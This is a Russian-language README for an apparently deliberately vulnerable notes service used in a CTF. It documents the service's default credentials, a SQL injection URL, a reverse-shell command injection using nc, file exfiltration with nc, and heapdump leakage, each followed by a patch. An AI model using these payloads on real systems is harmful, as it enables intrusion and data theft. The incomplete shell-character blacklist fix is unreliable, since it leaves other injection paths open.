# Документация

### Запуск
----------
Для запуска на хостовой машине должны быть установлены:
1. [openjdk 20](https://jdk.java.net/20/)
2. [maven](https://maven.apache.org/)
3. [docker](https://www.docker.com/)
4. Bash или другой шелл

Для запуска необходимо по очереди выполни два скрипта.<br/>
Первый это `create-image.sh`, он создаст докер образ.<br/>
Второй это `run-image.sh`, он запустит докер образ.

### Стандартные пользователи
----------------------------
В приложение добавлены два стандартных пользователя.
1. login: `admin`, password: `admin` - является админом и может просматривать записи всех пользователей
2. login `user`, password: `user` - обычный пользователь

Чтобы изменить порт, на котором будет работать сервис нужно:
1. изменить его в файле `src/main/resources/application.yml`
2. нужно изменить в файле `run-image.sh`

## Разбор уязвимостей и их патч
### 1 логин и пароль по умолчанию
---------------------------------
Первым делом следует проверить, не забыл ли кто-то сменить пароль для администратора.
#### Фикс:
сменить логин для админа через экран смены пароля.
### 2 слабые настройки и настройки по умолчанию
-----------------------------------------------
В файле `applicaton.yml` находятся настройки системы.<br/>
Слабыми настройками является:
- `h2.console.enable: true` которая включает веб консоль
- `h2.console.path: /h2-ui` которая определяет URL адрес веб интерфейса для БД
- `datasource.username: sa` которая определяет имя пользователя для БД
- `datasource.password: ` которая задает пароль для БД (по умолчанию пароль отсутствует) 

#### Фикс:
сменить данные настройки
### 3 SQLI
----------
Если залогиниться под пользователем, то внизу страницы будут доступны фильтры. При изменении фильтр отправляется GET request: `http://{host}:{port}/notes?filter=ACTIVE&sort=TIMESTAMP`.<br/>
В этот запрос можно вставить SQLI. Например: `http://{host}:{port}/notes?filter=ACTIVE&sort=TIMESTAMP;update%20custom_user%20set%20is_admin%20=%20true%20where%20username%20=%20%27user%27`. Этой SQLI мы меняем права для пользователя `user`. Так же можно сменить пароль администратору или выполнить любое другое действие.
#### Фикс:
Для исправления этой уязвимости обернем поля в Enum, которые подставляются в SQL запрос. Это поля `sort` и `filter`. Поле `filter` уже обернута в Enum. Осталось обернуть поле `sort`. Самый простой способ это сделать так:
```java
NoteSortEnum.valueOf(sort).toString()
```
Это нужно сделать в методах `findAllWithFilterAndSort` и `findAllByOwnerNameWithFilterAndSort` в классе `NoteService`.<br/>
Получаем следующий код:
- `findAllWithFilterAndSort`
```java
 public List<Note> findAllWithFilterAndSort(
    @NonNull NoteFilterEnum filter,
    @NonNull String sort
) {
    var noteEntityList = switch (filter) {
        case ALL -> noteRepository.findAllWithSort(NoteSortEnum.valueOf(sort).toString());
        case ACTIVE -> noteRepository.findAllWithFilterAndSort(false, NoteSortEnum.valueOf(sort).toString());
        case COMPLETED -> noteRepository.findAllWithFilterAndSort(true, NoteSortEnum.valueOf(sort).toString());
    };
    return mapEntityToModel.mapNoteEntityListToNoteModelList(noteEntityList);
}
```
- `findAllByOwnerNameWithFilterAndSort`
```java
public List<Note> findAllByOwnerNameWithFilterAndSort(
    @NonNull String name,
    @NonNull NoteFilterEnum filter,
    @NonNull String sort
) {
    var noteEntityList = switch (filter) {
        case ALL -> noteRepository.findAllByOwnerUsernameWithSort(name, NoteSortEnum.valueOf(sort).toString());
        case ACTIVE -> noteRepository.findAllByOwnerUsernameWithFilterAndSort(name, false, NoteSortEnum.valueOf(sort).toString());
        case COMPLETED -> noteRepository.findAllByOwnerUsernameWithFilterAndSort(name, true, NoteSortEnum.valueOf(sort).toString());
    };
    return mapEntityToModel.mapNoteEntityListToNoteModelList(noteEntityList);
}
```
### CLII
--------
Данная уязвимость закрыта в поле проверить ссылку. Там можно выполнять и другие команды Shell. Можно написать следующую ссылку `google.com; nc {host} {port} -e /bin/sh` и запустить прослушивание на своей машине этого порта, что откроет reverse shell. Дальше требуется скачать файл сборки `super-todo.jar` и файл БД `testbd.mv.db`.<br/>
Это можно сделать множеством способов. Например на host выполнить `nc -lp 8010 > /tmp/j.jar`, а на attacked `cat super-todo.jar | nc {host} 8010`. После чего файл будет скачен. Дальше нужно декомпилировать `super-todo.jar`. Для этого можно воспользоваться `jd-gui`.<br/>
В декомпилированном jar файле находим файл с конфигом. Дальше можно подключиться через WEB-consol к БД и прочитать от туда флаги.
#### Фикс:
Самый простой способ это в маппере `MapDtoToModelInt` в методе `mapFormatLink` написать замену для всех возможных разделителей команд в shell.
```java
@Named("formatLink")
default String mapFormatLink(String link) {
    link = link
        .replace(";", "")
        .replace("&&", "")
        .replace("||", "")
        .replace("\n", "");
    if (link.startsWith("http")) {
        return link;
    } else {
        return String.format("http://%s", link);
    }
}
```
### HeapDump
------------
Данной уязвимостью можно воспользоваться не в любой момент времени. Для того чтобы она сработала требуется выполнения двух условий:
1. кто-то должен прочитать флаг из БД. То есть собственники сервиса должны зайти под админом, которому видны записи всех пользователей или чтобы чекер произвел проверку.
2. сборщик мусора не успел почистить память.

При тестах два условия выполнялись очень часто. Суть уязвимости заключается в следующем. У авторизованного пользователя есть доступ к набору скрытых эндпоинтов\ручек. Список всех этих ручек можно получить выполнив `GET http://{host}:{port}/actuator`. Интересным является запрос с получением дампа кучи. Его можно получить выполнив `GET http://{host}:{port}/actuator/heapdump`. После этого загружается файл с дампом кучи. Для поиска флага можно выполнить `string heapdump | grep "&textBody="`. Данная команда выведет список всех тел заметок, которые были в куче.
#### Фикс:
Для фикса нужно просто выключить этот эндпоинт. Можно отключить все кроме `health`, поскольку он показывает работает сервис или нет. <br/>
Пример:
```
management:
  endpoints:
    web:
      exposure:
        include: "*" #health - need for life
        exclude: heapdump
```
